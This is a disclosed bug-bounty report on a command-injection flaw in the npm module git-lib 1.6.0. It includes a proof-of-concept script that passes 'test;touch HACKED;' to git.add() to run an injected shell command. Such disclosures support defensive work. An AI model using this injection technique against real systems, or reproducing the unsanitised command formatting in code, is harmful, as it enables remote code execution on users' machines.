# [git-lib] RCE via insecure command formatting

## Report Details
- **Report ID**: 718241
- **URL**: https://hackerone.com/reports/718241
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-20T11:52:33.911Z
- **Disclosed**: 2020-09-24T16:17:52.871Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `git-lib` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `git-lib`
**version:** `1.6.0`
**npm page:** `https://www.npmjs.com/package/git-lib`

## Module Description
> A library that contains different methods to be consumed by a node module

## Module Stats
[~4/5] downloads in the last day
[30] downloads in the last week
[~120] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/shime/git-lib/blob/master/index.js#L32

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var git = require("git-lib");

git.add("test;touch HACKED;").then(function(){
    /** successfully added **/
}).catch(function(err){
    /** unsuccessful **/
});

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i git-lib # Install affected module
git init # Avoid problems with *git*
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F612830}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `git-lib`

## Attachments
- Screenshot_from_2019-10-20_13-47-50.png
